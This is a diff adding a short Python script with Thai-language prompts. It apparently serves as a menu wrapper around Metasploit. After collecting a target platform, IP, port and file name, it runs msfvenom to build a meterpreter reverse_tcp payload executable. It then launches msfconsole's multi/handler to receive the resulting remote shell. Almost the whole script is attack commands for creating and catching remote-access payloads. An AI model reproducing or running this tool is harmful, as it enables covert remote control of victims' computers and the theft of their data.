@@ -1,0 +1,17 @@
+import os
+import time
+time.sleep(3)
+os.system ("clear")
+os.system ("cd /$HOME/msf/system;python3 progressbar.py")
+os.system ("clear")
+os.system (" neofetch --ascii_distro windows10 --logo")
+la = input ("windows : ")
+ip = input ("ไอพี : ")
+port = input ("พอร์ท : ")
+out = input ("ชื่อไฟล์ ตามด้วย exe : ")
+outfile = input ("พิม exe : ")
+os.system ("msfvenom -p %s/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f %s -o %s" % (la, ip, port, outfile, out))
+la = input ("android/python/php/windows : ")
+ip = input ("ไอพี : ")
+port = input ("พอร์ท : ")
+os.system ("msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD %s/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; exploit;'" % (la, ip, port,))
